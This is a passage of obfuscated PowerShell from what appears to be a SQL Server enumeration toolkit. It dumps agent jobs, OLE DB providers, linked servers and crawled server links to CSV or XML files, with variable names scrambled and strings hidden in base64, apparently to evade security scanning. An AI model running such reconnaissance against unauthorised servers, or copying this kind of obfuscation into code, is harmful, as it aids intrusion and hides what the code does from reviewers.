        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGEAZwBlAG4AdABfAGoAbwBiAHMALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEEAZwBlAG4AdAAgAEoAbwBiAHMAIAB0AGgAYQB0ACAAdQBzAGUAIABnAGwAbwBiAGEAbAAgAHQAZQBtAHAAIAB0AGEAYgBsAGUAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLAgentJob -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Keyword "##"
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGEAZwBlAG4AdABfAGoAbwBiAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGEAZwBlAG4AdABfAGoAbwBiAHMAXwBnAGwAbwBiAGEAbAB0AG0AcAB0AGIAbAAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAE8ATABFACAARABCACAAcAByAG8AdgBkAGUAcgAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLOleDbProvder -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAG8AbABlAGQAYgBwAHIAbwB2AGkAZABlAHIAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAG8AbABlAGQAYgBwAHIAbwB2AGkAZABlAHIAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        } 
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAbABpAG4AawBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerLink -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAaQBuAGsAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAaQBuAGsAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        if($CrawlLinks){
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAQwByAGEAdwBsAGkAbgBnACAAbABpAG4AawBlAGQAIABzAGUAcgB2AGUAcgBzAC4ALgAuAA==')))
            ${__/\/=\/=\/\/\_/\} = Get-SQLServerLinkCrawl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Export2
            if($xml)
            {
                ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAaQBuAGsAcwBfAGMAcgBhAHcAbAAuAHgAbQBsAA==')))
                ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
            }
            else
            {
                ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAaQBuAGsAcwBfAGMAcgBhAHcAbAAuAGMAcwB2AA==')))
                ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
            }
        }               
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARQBOAEQA')))
    }
    End
    {
    }
}
